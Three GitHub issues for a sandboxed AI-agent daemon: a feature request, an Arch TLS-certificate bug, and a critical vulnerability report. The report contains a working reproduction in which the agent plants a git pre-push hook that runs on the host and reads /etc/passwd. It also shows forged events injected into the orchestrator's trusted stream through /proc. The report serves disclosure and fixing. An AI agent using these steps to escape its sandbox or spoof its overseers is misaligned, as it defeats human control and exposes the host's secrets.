title: Feature: start sessions from GitHub (mentions/assignments on issues and PRs)
body:
## Summary

Let a session be started from GitHub, not only from Discord. A mention of the
bot account in an issue/PR (or an assignment) should open a session the same way
a message in the chat channel does, with the repository as the project and the
issue/PR as the thread.

Today GitHub is only an **output**: the agent clones, pushes and opens pull
requests. It is never an **input**, so "ping the bot in an issue" does nothing.
For an agent whose work lives in repositories, the issue tracker is the natural
place to ask for it.

## Proposed behaviour

- Watch a configured set of repositories for activity that addresses the bot:
  a mention of its account (`@the-bot`) in an issue or PR body/comment, and/or
  an assignment to it.
- Start a session with:
  - `project` = the repository (cloned as it already is for PR work),
  - `prompt` = the mentioning text, with the mention removed,
  - the session bound to that issue/PR so later comments continue the same
    session (the way replies in a chat thread do).
- Post the agent's output back to where the task came from: a comment on the
  issue/PR, and the diff/PR as it already does.
- Reuse the existing session, memory, sandbox and admission machinery; this is a
  second task source, not a second daemon.

## Configuration sketch

```json
{
  "github": {
    "token": "...",
    "userName": "...",
    "userEmail": "...",
    "trigger": {
      "repositories": ["owner/repo"],
      "on": ["mention", "assigned"],
      "allowedUsers": ["..."]
    }
  }
}
```

Absent `trigger` means GitHub is output-only, as now.

## Relationship to the web interface

The daemon already exposes `POST /api/sessions` (`{ project, prompt }`) that can
start a session, so this is reachable today with an external bridge. A
first-class source is preferable: it keeps reply-threading and output routing
inside the daemon, needs no extra process or inbound endpoint, can poll with the
token already configured (`github.token`), and stays under the same admission
and reporting rules as chat sessions.

## Security

A GitHub-triggered message starts sandboxed code the same as a chat message, so
the trigger needs the same care: a repository and author allowlist, and the
understanding that the GitHub token is already reachable by the agent.

## Alternatives considered

- An external bridge calling the local web API: works, but needs a separate
  process, does not map issue/PR replies back to the session, and duplicates
  routing the daemon already owns.
- Treating GitHub notifications as chat messages: not possible without a
  transport the daemon does not have.

title: Critical: orchestrator's host-side git executes repository hooks/credential helpers -> host code execution as the daemon user
body:
## Summary

A confined session can achieve **arbitrary code execution on the host, as the daemon's user**, with no sandbox escape required. The daemon opens pull requests itself by running `git` **on the host** (via `new Deno.Command`, outside bailey) with the project directory as cwd. That directory is writable by the agent, so everything git reads from it is attacker-controlled — and git executes parts of it:

- `.git/hooks/pre-push` — run by the daemon's `git push --force-with-lease`.
- `.git/config` `credential.helper` — run during the push's authentication.
- (also `core.hooksPath`, `core.fsmonitor`, `diff.*.textconv`, `filter.*`, aliases, etc.)

The "a pull request was asked for" gate and the PR title are files in the agent's own writable state directory (`/state/pull-request-asked`, `/state/pull-request.txt`), so the agent can trigger the whole path by itself; `onSettled()` calls `openRequestedPullRequest()` every turn.

## Affected code

`src/session/pr.ts`:

```ts
export const runCommand: Run = async function runCommand(command, options) {
  const output = await new Deno.Command(program, {
    args, stdout: "piped", stderr: "piped",
    ...(options.cwd === undefined ? {} : { cwd: options.cwd }),
    clearEnv: true,
    env: { PATH: Deno.env.get("PATH") ?? "", HOME: Deno.env.get("HOME") ?? "", ...options.env },
  }).output();
};
```

`git()` runs `["git", ...args]` with `cwd = projectPath` (the agent's `/workspace`); `openPullRequest` then runs `git ... push --force-with-lease ...`. No bailey, no Landlock, no seccomp — this is the daemon user's plain shell environment.

## Reproduction

Inside a session (the agent can do all of this with the tools it already has):

```sh
cd /workspace
git init -q
git config user.email x@y; git config user.name x
git remote add origin https://github.com/<bot>/<repo>.git   # any forkable repo
cat > .git/hooks/pre-push <<'EOF'
#!/bin/sh
id > /workspace/HOST-RCE-proof.txt          # /workspace is the host bind source on the host
head -5 /etc/passwd >> /workspace/HOST-RCE-proof.txt
echo "ran on host" > "$HOME/HOST-RCE-marker"  # the real host home
exit 1                                       # abort the push, no PR needed
EOF
chmod +x .git/hooks/pre-push
mkdir -p /state
printf '000000000000000000\nTitle\n' > /state/pull-request-asked
printf 'Title\n' > /state/pull-request.txt
```

The daemon runs `git push` on the host at turn end and the hook executes.

## Evidence

The daemon's own log proves the hook ran on the host — the message is the host `/bin/sh` failing to find the sandbox path (which exists **inside** the sandbox but not on the host):

```
could not open a pull request detail=Error: could not push work:
/bin/sh: 0: cannot open /workspace/.p15_payload.sh: No such file
```

With the payload using a host-correct path, it then ran as the daemon user and left proof in the real home:

```
/home/samuel/HOST-RCE-marker -> "pre-push ran on host ..."
HOST-RCE-proof.txt: id=uid=1000(samuel) HOME=/home/samuel
                    real /etc/passwd, real $HOME listing
HOST-passwd.txt:    host /etc/passwd copied into the workspace
```

## Impact

Arbitrary code execution on the host as the daemon's user, outside every sandbox control, triggerable by any account allowed to drive a session (in this deployment, everyone in the channel). From there: read the daemon config (`chat.token`, `agent.credential`, `github.token`), read/write any file the daemon user can, install persistence, etc. The sandbox is fully bypassed.

## Suggested fix

Run host-side git against the agent-writable tree with a sanitised configuration and no dependency on repository config, e.g.:

```
git -c core.hooksPath=/dev/null \
    -c credential.helper= \
    -c core.fsmonitor=false \
    ...
```

plus `GIT_CONFIG_NOSYSTEM=1` and an empty/`/dev/null` global config, and disable textconv/filters for the operations used. Stronger: perform the push from a process whose cwd/config the agent cannot write (e.g. a fresh clone made host-side, or the GitHub API), and keep the "PR asked for" gate out of the agent's writable state directory (require an out-of-band, human-attributable action).

## Secondary (same daemon, related severity)

The agent can also take over the orchestrator control plane via `/proc`:

- `/proc/<pid>/environ` is readable (secret names/values from processes' env).
- `/proc/1/fd/1` (pi's stdout → the daemon's trusted JSONL event stream) is **writable**; forged events were accepted as genuine agent output (a fake `post` and a fake `bash` tool call appeared in `transcript.jsonl`).
- `/proc/1/fd/0` is writable (RPC injection toward the agent).

Worth restricting `/proc` (a fresh procfs in a PID namespace, or binding only the files needed) and treating the event stream accordingly.

## Related

- bailey#6 (fixed): relocated-grant cwd regression.
- bailey-side metadata/egress/userns findings (chmod/setxattr on read-granted host paths, UDP egress unrestricted, `clone(CLONE_NEWUSER)`) are separate from this and best tracked in QaidVoid/bailey.

title: sandbox: TLS fails on Arch hosts because /etc/ca-certificates is not granted
body:
TLS verification fails in every session on an Arch-family host, so the session cannot reach the provider. The comment on `SYSTEM_READ` in `src/sandbox/policy.ts` says that is exactly what the CA grant exists to prevent.

## What happens

`curl`:

```
curl: (77) error adding trust anchors from file: /etc/ssl/certs/ca-certificates.crt
```

Go programs (gh, and the provider client):

```
tls: failed to verify certificate: x509: certificate signed by unknown authority
```

`gh` then reports the token as invalid, because it cannot reach `api.github.com` to validate it.

## Root cause

`SYSTEM_READ` in `src/sandbox/policy.ts` grants `/etc/ssl` and `/etc/ca-certificates.conf`, but not the directory that the `/etc/ssl` symlinks point into on Arch:

```ts
  // Certificate authorities, or TLS fails and the provider is unreachable.
  "/etc/ssl",
  "/etc/ca-certificates.conf",
  "/etc/pki",
```

The Arch `ca-certificates` package does not ship a real bundle under `/etc/ssl`. It symlinks into `/etc/ca-certificates/extracted/`:

```
/etc/ssl/certs/ca-certificates.crt -> ../../ca-certificates/extracted/tls-ca-bundle.pem
/etc/ssl/certs/002c0b4f.0 -> ../../ca-certificates/extracted/cadir/GlobalSign_Root_R46.pem
```

`/etc/ca-certificates` is not in the list, so inside the session those symlinks dangle. The p11-kit source is inside the already granted `/usr` (`/usr/share/ca-certificates/trust-source/mozilla.trust.p11-kit`), but the extracted bundle that OpenSSL and Go actually load is not reachable.

## Reproduce (inside a session, Arch or Artix host)

```
$ readlink /etc/ssl/certs/ca-certificates.crt
../../ca-certificates/extracted/tls-ca-bundle.pem
$ ls /etc/ca-certificates
ls: cannot access '/etc/ca-certificates': No such file or directory
$ curl -sS https://api.github.com
curl: (77) error adding trust anchors from file: /etc/ssl/certs/ca-certificates.crt
```

Pointing the usual variables at a bundle built from the p11-kit source works, which isolates the problem to the missing grant:

```
$ trust extract --format=pem-bundle --purpose=server-auth /state/ssl/ca.pem
$ SSL_CERT_FILE=/state/ssl/ca.pem curl -sS -o /dev/null -w '%{http_code}\n' https://api.github.com
200
```

## Suggested fix

Add `/etc/ca-certificates` next to the config file that is already granted:

```ts
  "/etc/ssl",
  "/etc/ca-certificates.conf",
  "/etc/ca-certificates",
  "/etc/pki",
```

It is extracted, read-only certificate data, so this does not widen the write or execute surface. Debian and Ubuntu carry a real bundle in `/etc/ssl/certs` and Fedora and RHEL use `/etc/pki`, both already granted, so this only covers the Arch family.

@QaidVoid flagging you as requested from the session that hit this.
